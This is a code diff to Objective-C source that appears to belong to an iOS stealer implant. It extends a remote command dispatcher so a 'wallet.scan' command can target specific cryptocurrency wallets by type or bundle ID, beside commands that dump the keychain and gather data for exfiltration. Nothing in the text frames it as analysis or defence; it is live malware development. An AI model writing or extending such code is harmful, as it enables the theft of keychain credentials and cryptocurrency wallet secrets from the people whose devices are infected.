@@ -327,14 +327,34 @@ static NSString *DSKeychainDump(void)
 }
 
 /// Re-runs the persist-store harvest and returns its snapshot JSON.
-static NSString *DSWalletScan(void)
+static NSArray<NSDictionary *> *DSWalletTargets(void);
+static void DSWalletScanOne(NSDictionary *wallet);
+
+/// wallet.scan [type] [bundleId] — scan a specific wallet via the MCM bridge.
+/// With no type (or "metamask") falls back to the persist-store harvest.
+static NSString *DSWalletScan(NSString *type, NSString *bundleId)
 {
-    TryMaskCardPersistHarvest(YES);
-    NSDictionary *snapshot = TryMaskCardPersistStoreSnapshot();
-    NSData *json = snapshot
-        ? [NSJSONSerialization dataWithJSONObject:snapshot options:0 error:nil] : nil;
-    return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding]
-                : @"harvest queued";
+    if (type.length == 0 || [type isEqualToString:@"metamask"]) {
+        TryMaskCardPersistHarvest(YES);
+        NSDictionary *snapshot = TryMaskCardPersistStoreSnapshot();
+        NSData *json = snapshot
+            ? [NSJSONSerialization dataWithJSONObject:snapshot options:0 error:nil] : nil;
+        return json ? [[NSString alloc] initWithData:json encoding:NSUTF8StringEncoding]
+                    : @"metamask harvest queued";
+    }
+
+    NSDictionary *target = nil;
+    for (NSDictionary *wallet in DSWalletTargets()) {
+        if ([wallet[@"type"] isEqualToString:type] ||
+            (bundleId.length > 0 && [wallet[@"bundleId"] isEqualToString:bundleId])) {
+            target = wallet;
+            break;
+        }
+    }
+    if (!target) return [NSString stringWithFormat:@"unknown wallet: %@", type];
+
+    DSWalletScanOne(target);
+    return [NSString stringWithFormat:@"wallet %@ scan dispatched", type];
 }
 
 /// Wallet catalog mirroring coruna-v2's WALLET_CONFIG, resolved through the MCM
@@ -502,7 +522,10 @@ static NSString *DSExecuteCommand(NSString *command)
     NSString *verb = words.firstObject.lowercaseString;
     if ([verb isEqualToString:@"system.info"]) return DSDeviceInfo();
     if ([verb isEqualToString:@"keychain.dump"]) return DSKeychainDump();
-    if ([verb isEqualToString:@"wallet.scan"]) return DSWalletScan();
+    if ([verb isEqualToString:@"wallet.scan"]) {
+        return DSWalletScan(words.count >= 2 ? words[1] : nil,
+                            words.count >= 3 ? words[2] : nil);
+    }
     if ([verb isEqualToString:@"wallet.scan.all"]) return DSWalletScanAll();
     if ([verb isEqualToString:@"collect"] || [verb isEqualToString:@"exfil.collect"]) {
         DarkSwordCollectAll();
